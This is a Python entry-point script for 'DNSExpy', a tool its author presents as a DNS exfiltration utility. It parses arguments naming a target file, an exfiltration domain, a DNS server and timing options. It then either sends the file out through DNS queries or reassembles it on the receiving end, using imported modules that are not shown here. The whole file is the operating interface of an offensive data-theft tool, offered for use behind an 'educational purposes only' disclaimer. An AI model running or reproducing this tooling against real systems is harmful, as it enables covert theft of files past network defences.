import argparse
import os
import pyfiglet
from DNSExSnd import DNSExSnd
from DNSExRcv import DNSExRcv

def clearScreen(): os.system('cls' if os.name == 'nt' else 'clear')

def showTitle():
  clearScreen()
  pyfiglet.print_figlet("DNSExpy.py", font="doom")
  print("DNS Exfiltration Spy")
  print("Author: @dgonzalez55 a.k.a. MaeseLeGon")
  print("Github: https://github.com/dgonzalez55/dnsExpy")
  print("Version: 1.0.0")
  print("")

def loadParams():
  parser = argparse.ArgumentParser(description='DNSExpy.py - DNS Exfiltration Spy',formatter_class=argparse.ArgumentDefaultsHelpFormatter)
  # Just a hack to change the title of default options
  parser._optionals.title = 'Basic Options'
  parser.add_argument('-f','--file', dest='filename', help='Target file to exfiltrate or recover', required=True)
  parser.add_argument('-d','--domain', dest='domain', help='Domain used in data exfiltration', required=True)
  parser.add_argument('-m','--mode', dest='mode', help='Mode to be used (send or recover)', required=True, choices=['send','recover'])
  parser.add_argument('-D','--dns', dest='dns', help='DNS server to query', required=False, default="localhost")
  parser.add_argument('-p','--port', dest='dnsPort', help='DNS port to be used', required=False, default=53, type=int)
  parser.add_argument('-o','--output', dest='outputFile', help='Output file to save recovered data (only used when recovering data)', required=False, default="recovered")
  advanced = parser.add_argument_group(title='Advanced Options', description='These options are advanced and may not be needed for most users.')
  advanced.add_argument('-r','--requests', dest="requests", help='Number of requests to send for each data chunk', required=False, type=int, default=2)
  advanced.add_argument('-t','--time-frame', dest="delay", help='Number of seconds to wait bewteen each data chunk sent', required=False, type=int, default=1)
  advanced.add_argument('-v','--verbose', dest='verbose', help='Verbose output', action='store_true',required=False)
  advanced.add_argument('-z','--zip', dest='zip', help='If zip compress is required by the exfiltration process', action='store_true',required=False)
  return parser.parse_args()

if __name__ == "__main__":
  showTitle()
  params = loadParams()
  if params.mode == "send":
    print("Starting DNS exfiltration process...")
    dnsEx = DNSExSnd(**vars(params))
    dnsEx.exfiltrate()
  else:
    print("Starting DNS recovery process...")
    dnsEx = DNSExRcv(**vars(params))
    dnsEx.recoverExfiltrated()
  print('Remember this tool is for educational purposes only!')